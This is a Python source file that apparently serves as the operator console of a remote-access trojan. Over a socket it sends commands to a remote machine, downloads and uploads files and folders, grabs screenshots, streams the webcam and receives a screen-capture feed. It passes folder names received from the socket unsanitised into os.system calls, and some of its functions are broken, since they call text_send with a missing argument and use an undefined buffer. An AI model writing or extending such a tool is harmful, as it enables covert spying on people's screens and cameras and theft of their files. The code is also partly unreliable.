import socket
import os
import time
import numpy as np
# import cv2
import threading




def text_send(s, text):
    s.send(bytes(str(text), "utf-8"))


def listall(list_path):
    all_folders = []
    all_files = []
    for root, folders, files in os.walk(list_path):

        for eachfold in folders:
            all_folders.append(root.replace("\\", "/") +
                               "/"+eachfold.replace("\\", "/"))

        for eachfile in files:
            all_files.append(os.path.join(root, eachfile))
            print(eachfile)

    return all_folders, all_files


def start_screencapture(ip):
    screenshare_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    screenshare_sock.bind((ip, 31205))
    screenshare_sock.listen(5)
    screenshare_sock, screenshare_addr = screenshare_sock.accept()

    while True:

        filename = screenshare_sock.recv(1024)
        screenshare_sock.send(bytes("ok", "utf-8"))
        filesize = screenshare_sock.recv(1024)
        screenshare_sock.send(bytes("ok", "utf-8"))
        filesize = int(filesize)

        try:
            with open(filename, "wb") as f:

                data = screenshare_sock.recv(1024)
                totalr = len(data)
                f.write(data)
                while totalr < filesize:
                    data = screenshare_sock.recv(1024)
                    totalr += len(data)
                    f.write(data)

            screenshare_sock.send(bytes("ok", "utf-8"))
            screenshare_sock.recv(4)
            screenshare_sock.send(bytes("ok", "utf-8"))
        except PermissionError:
            time.sleep(1)
            with open(filename, "wb") as f:

                data = screenshare_sock.recv(1024)
                totalr = len(data)
                f.write(data)
                while totalr < filesize:
                    data = screenshare_sock.recv(1024)
                    totalr += len(data)
                    f.write(data)

            screenshare_sock.send(bytes("ok", "utf-8"))
            screenshare_sock.recv(4)
            screenshare_sock.send(bytes("ok", "utf-8"))


def download(cmd, s):
    d_typa_file = s.recv(32).decode("utf-8")
    if d_typa_file.startswith("file //"):
        s.send(bytes("ok", "utf-8"))
        filesize = int(d_typa_file.replace("file //", ""))
        with open(cmd.replace("download ", ""), "wb") as f:
            starting_time = time.time()
            data = s.recv(1024)
            totalr = len(data)
            f.write(data)
            while totalr < filesize:
                data = s.recv(1024)
                totalr += len(data)
                f.write(data)
                speed_divider = 1
                speed_unit = " bytes"
                speed_bytes = totalr/(time.time() - starting_time)
                if speed_bytes > 1000:
                    speed_divider = 1000
                    speed_unit = " kbps"

                    if speed_bytes > 1000000:
                        speed_divider = 1000000
                        speed_unit = " mbps"

                        if speed_bytes > 1000000000:
                            speed_divider = 1000000000
                            speed_unit = " gbps"
                speed = str((speed_bytes/speed_divider))[:5]
                print(str(totalr) + "/" + str(filesize) +
                      " /// " + speed + speed_unit)
        f.close()

        s.send(bytes("File downloaded: " +
                     cmd.replace("download ", ""), "utf-8"))
    elif d_typa_file.startswith("folder //"):
        print("---- Starting to create folders ----- ")
        text_send("ok")

        length_of_fold = s.recv(1024)

        text_send("ok")
        os.system("mkdir " + cmd.replace("download ",
                                         "").replace(" ", "\ "))
        print("mkdir " + cmd.replace("download ", ""))
        for a in range(0, int(length_of_fold)):

            foldername = s.recv(1024).decode("utf-8")
            print(os.system("mkdir " + foldername))
            os.system("mkdir " + foldername.replace(" ", "\ "))
            text_send("ok")

        print("---- Starting to recieve files -----")
        length_of_files = s.recv(1024).decode("utf-8")
        print("recieved number of files" + str(length_of_files))

        text_send("ok")
        print("Sent ok")
        for a in range(0, int(length_of_files)):

            filename = s.recv(1024).decode("utf-8")
            print("Recieved filename as " + str(filename))
            text_send("ok")
            print("Sent ok")

            filesize = s.recv(1024)
            filesize = filesize.decode("utf-8")
            print("recieved file size" + filesize)

            text_send("ok")
            print("Sent ok")

            filesize = int(filesize)

            with open(filename, "wb") as f:
                print("Opned file")
                starting_time = time.time()
                print("started recieveing file")
                data = s.recv(1024)
                print("recieved first parts")
                text_send("ok")
                print("sent ok")
                totalr = len(data)
                f.write(data)
                print("going inside while loop")
                while totalr < filesize:
                    print("inside while loop")
                    data = s.recv(1024)
                    print("recieved 1024 bytes")
                    text_send("ok")
                    print("sent ok")
                    totalr += len(data)
                    f.write(data)
                    speed_divider = 1
                    speed_unit = " bytes"
                    speed_bytes = totalr / \
                        (time.time() - starting_time)
                    if speed_bytes > 1000:
                        speed_divider = 1000
                        speed_unit = " kbps"
                        if speed_bytes > 1000000:
                            speed_divider = 1000000
                            speed_unit = " mbps"
                            if speed_bytes > 1000000000:
                                speed_divider = 1000000000
                                speed_unit = " gbps"
                    speed = str((speed_bytes/speed_divider))[:5]
                    print(str(totalr)+"/"+str(filesize))
                    # print(str(totalr) + "/" + str(filesize) + " /// " + speed + speed_unit)
            f.close()
            s.send(bytes("File downloaded: " +
                         cmd.replace("download ", ""), "utf-8"))


def upload(cmd, s):
    filename = cmd.replace("upload ", "")
    if os.path.isfile(filename):

        with open(filename, "rb") as f:
            s.send(
                bytes("file //" + str(os.path.getsize(filename)), "utf-8"))

            print(s.recv(4).decode("utf-8"))
            l = f.read(1024)
            s.send(l)
            while l != b'':
                l = f.read(1024)
                s.send(l)

        f.close()

        print(s.recv(buffer).decode("utf-8"))
    else:
        s.send(bytes("folder //", "utf-8"))
        s.recv(4)
        all_folders, all_files = listall(
            cmd.replace("upload ", ""))
        s.send(bytes(str(len(all_folders)), "utf-8"))
        s.recv(4)
        for a in all_folders:
            print(a)
            a = "\"" + a + "\""
            s.send(bytes(a, "utf-8"))
            s.recv(4)

        s.send(bytes(str(len(all_files)), "utf-8"))
        s.recv(4)

        for a in all_files:
            print("went to for loop")
            s.send(bytes(a.replace("\\", "/"), "utf-8"))
            print("sent filename" + a)

            print("recieved " + s.recv(4).decode("utf-8"))

            with open(a, "rb") as f:
                s.send(bytes(str(os.path.getsize(a)), "utf-8"))
                print("sent file size")

                print("recieved " + s.recv(4).decode("utf-8"))

                l = f.read(1024)
                s.send(l)
                print("sending data")
                print("recieved " + s.recv(4).decode("utf-8"))
                print("going inside while loop")
                while l != b'':
                    print(l)
                    print("went inside while loop")
                    l = f.read(1024)
                    print("sending data")
                    s.send(l)
                    print("sent data")
                    s.recv(4)

            f.close()
            s.recv(1024)


def webcam(s, cmd):
    try:
        s.send(bytes("ok", "utf-8"))

        while True:
            d_typa_file = s.recv(32).decode("utf-8")
            if d_typa_file.startswith("file //"):
                s.send(bytes("ok", "utf-8"))
                filesize = int(d_typa_file.replace("file //", ""))

                with open("lol.png", "wb") as f:
                    data = s.recv(1024)

                    totalr = len(data)
                    f.write(data)
                    while totalr < filesize:
                        data = s.recv(1024)
                        totalr += len(data)
                        f.write(data)

                f.close()

            s.send(bytes("File downloaded: " +
                         cmd.replace("download ", ""), "utf-8"))

    except KeyboardInterrupt:
        while totalr < filesize:
            data = s.recv(1024)
            totalr += len(data)

        print("stopping stream")
        text_send("stop")


def screenshot(s):
    print("inside screenshot")
    filename = s.recv(1024)
    filename = "lol.jpg"
    s.send(bytes("ok", "utf-8"))
    filesize = s.recv(1024)
    s.send(bytes("ok", "utf-8"))
    filesize = int(filesize)
    print(filesize)

    with open(filename, "wb") as f:

        data = s.recv(1024)
        totalr = len(data)
        f.write(data)
        while totalr < filesize:
            data = s.recv(1024)
            totalr += len(data)
            f.write(data)

            print(str(totalr) + "/" + str(filesize))

    s.send(bytes("ok", "utf-8"))
    s.recv(8)


def set_buffer(cmd):
    try:
        buffer = int(cmd.replace("set buffer ", ""))
        output = "Buffer has been set in server"
        print(output)
    except:
        output = "Buffer has failed to set in server"
        print(output)


def printing_file(s,buffer):
    new_cmd1 = s.recv(buffer)
    new_cmd1 = new_cmd1.decode("utf-8")
    new_cmd1 = new_cmd1.replace("New buffer = ", "")
    buffer = int(new_cmd1)
    print("buffer of server from client " + str(buffer))


    
def advanced(s, ip):

    current_loc = "none"
    global buffer
    buffer = 1024

    while True:
        cmd = input(current_loc.replace("\n", "") + " --> ")
        if not cmd == "":
            
            if cmd == "background":
                break

            s.send(bytes(cmd, "utf-8"))

            if cmd.startswith("cat ") or cmd.startswith("download ") or cmd.startswith("type "):
                printing_file(s,buffer)

            if cmd == "buffer":
                print("Buffer check from server " + str(buffer))

           

            elif cmd.startswith("download "):
                download(cmd, s)

            elif cmd.startswith("upload "):
                upload(cmd, s)

            elif cmd.startswith("set "):
                if cmd.replace("set ", "").startswith("buffer "):
                    set_buffer(cmd)

            elif cmd == "clear" or cmd == "cls":
                os.system("clear")
                os.system("cls")

            elif cmd == "webcam":
                webcam(s,cmd)

            elif cmd == "screenshot":
                screenshot(s)

            elif cmd == "start screencapture":
                threading.Thread(target=start_screencapture, args=[ip]).start()

            buffer = int(s.recv(1024).decode("utf-8")) + 1024
            s.send(bytes("ok", "utf-8"))
            msg = s.recv(buffer)
            try:
                sent = msg.decode("utf-8")

                print(sent.split(" /loc_split/ ")[0])
            except:
                sent = "lol"

            try:
                current_loc = sent.split(" /loc_split/ ")[1]
            except:
                pass
    
